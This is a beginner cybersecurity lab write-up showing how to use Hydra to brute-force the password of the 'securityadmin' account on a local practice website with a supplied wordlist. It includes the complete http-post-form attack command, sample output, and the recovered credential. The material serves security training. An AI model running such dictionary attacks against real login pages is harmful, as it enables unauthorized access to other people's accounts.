# Cracking a Specific User Account with Hydra

## Introduction

In this lab, you will use **Hydra** to crack the password for a specific user account on a locally hosted practice website. The objective is to perform a dictionary attack using a provided password list and save the results to a file.

> **Note:** This exercise is for educational purposes and should only be performed in authorized lab environments.

---

link to the room: https://labex.io/labs/linux-cracking-a-specific-user-account-415951?course=cybersecurity-labs-for-beginners

---

## Lab Details

- **Platform:** LabEx
- **Category:** Linux / Cybersecurity
- **Tool:** Hydra
- **Difficulty:** Beginner

---

## Objective

Use **Hydra** to crack the password for the following account:

- **Username:** `securityadmin`

Save the results to:

```text
~/project/hydra_results.txt
```

---

## Prerequisites

The following resources are already available:

- Practice website:

```text
http://localhost:8080
```

- Password list:

```text
~/project/passwords.txt
```

Hydra must be executed from:

```text
~/project
```

---

## Project Structure

```text
~/project
├── passwords.txt
└── hydra_results.txt
```

---

## Step 1 – Navigate to the Project Directory

```bash
cd ~/project
```

Verify the password list exists:

```bash
ls
```

Expected output:

```text
passwords.txt
```

---

## Step 2 – Run Hydra

Execute the following command:

```bash
hydra \
-l securityadmin \
-P passwords.txt \
localhost \
-s 8080 \
http-post-form "/:username=^USER^&password=^PASS^:F=Invalid username or password" \
-o hydra_results.txt
```

### Explanation

| Option | Description |
|---------|-------------|
| `-l securityadmin` | Specifies the target username |
| `-P passwords.txt` | Uses the supplied password list |
| `localhost` | Target host |
| `-s 8080` | Uses port 8080 |
| `http-post-form` | Attacks an HTTP POST login form |
| `F=Invalid username or password` | Indicates a failed login |
| `-o hydra_results.txt` | Saves results to a file |

---

## Step 3 – Hydra Running

Example output:

```text
Hydra v9.x

[DATA] attacking http-post-form://localhost:8080/

[STATUS] 300 tries/min
```

Wait until Hydra finishes testing all passwords.

---

## Step 4 – View the Results

Display the saved credentials:

```bash
cat hydra_results.txt
```

Expected output:

```text
[8080][http-post-form] host: localhost login: securityadmin password: brandon
```

---

## Credentials Found

| Username | Password |
|----------|----------|
| `securityadmin` | `brandon` |

---

## Step 5 – Verify the Login

Open the website:

```text
http://localhost:8080
```

Enter:

```text
Username: securityadmin
Password: brandon
```

You should successfully log in.

---

## Complete Command

```bash
cd ~/project

hydra \
-l securityadmin \
-P passwords.txt \
localhost \
-s 8080 \
http-post-form "/:username=^USER^&password=^PASS^:F=Invalid username or password" \
-o hydra_results.txt

cat hydra_results.txt
```

---

## Expected Output

```text
Hydra v9.x

[DATA] max 16 tasks per server
[DATA] attacking http-post-form://localhost:8080/

[8080][http-post-form] host: localhost login: securityadmin password: brandon

1 of 1 target successfully completed
```

---

## Screenshots

### Lab Instructions

![Lab Instructions](https://github.com/user-attachments/assets/e5955349-a413-417e-ad85-e2f1063317f3)

---

### Practice Website

![Practice Website](https://github.com/user-attachments/assets/ccc52438-80b0-4752-8c90-ecd7f11276b7)

---

### Hydra Command

![Hydra Command](https://github.com/user-attachments/assets/e03e3629-e606-4ef8-829e-8ccfc440d66b)

---

### Hydra Results

![Hydra Results](https://github.com/user-attachments/assets/846ff41f-b653-4e57-a8f9-8f1518e4d6f8)

---

### Login Page

![Login Page](https://github.com/user-attachments/assets/53c56587-6911-4165-9c57-bf1b5a3f5225)

---

### Successful Login

![Successful Login](https://github.com/user-attachments/assets/6a854cb1-a981-40f3-a6d4-75ddca4dbe0e)

---

## Key Takeaways

- Used **Hydra** to perform an HTTP POST dictionary attack.
- Targeted a specific username (`securityadmin`).
- Used a supplied password list (`passwords.txt`).
- Saved the results to `hydra_results.txt`.
- Successfully recovered the credentials:

```text
Username : securityadmin
Password : brandon
```

---

## Summary

In this lab, you successfully used **Hydra** to crack the password for a specific user account hosted on a local practice website. By supplying a username, a password wordlist, and the correct HTTP POST form parameters, Hydra identified the valid credentials and saved them to an output file. This exercise demonstrates how weak passwords can be discovered through automated dictionary attacks and reinforces the importance of using strong, unique passwords to improve security.
